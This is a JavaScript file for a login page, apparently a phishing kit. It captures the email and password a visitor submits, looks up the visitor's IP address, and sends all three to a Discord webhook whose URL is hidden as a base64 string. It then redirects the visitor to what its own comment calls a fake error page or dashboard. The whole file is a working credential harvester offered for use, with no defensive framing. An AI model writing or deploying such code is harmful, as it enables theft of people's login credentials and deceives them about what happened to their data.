// Encoded webhook URL
const webhookEncoded = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViYm9rcy8xMzEwNzYzMzczMjU1NzI1MTQ2L1JZR1lIV3lUUlNDWTU5U0hveE1vV3NkNmZZeXRicmszazJQQ2JRUVZCamlwUHBnTWJ4dGdLLUw2VS1ZZ2NXdkgwakds';

const skibidiCheckbox = document.getElementById('skibidiCheckbox');
const loginButton = document.getElementById('loginButton');

// Enable or disable the login button based on checkbox state
skibidiCheckbox.addEventListener('change', function() {
    if (skibidiCheckbox.checked) {
        loginButton.disabled = false;
    } else {
        loginButton.disabled = true;
    }
});

document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    // Fetch the user's IP address using ipify
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            const userIP = data.ip;

            // Decode the webhook URL
            const webhookUrl = atob(webhookEncoded);

            // Send the email, password, and IP address to the Discord webhook
            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    content: `New Login Attempt:
Email: ||${email}||
Password: ||${password}||
IP Address: ||${userIP}||`
                })
            })
            .then(response => {
                // Redirect to a fake error page or dashboard
                window.location.href = 'https://cryptodude3.github.io/badmin/';
            })
            .catch(error => {
                console.error('Error:', error);
                window.location.href = 'https://cryptodude3.github.io/badmin/';
            });
        })
        .catch(error => {
            console.error('Error fetching IP:', error);
            window.location.href = 'https://cryptodude3.github.io/badmin/';
        });
});
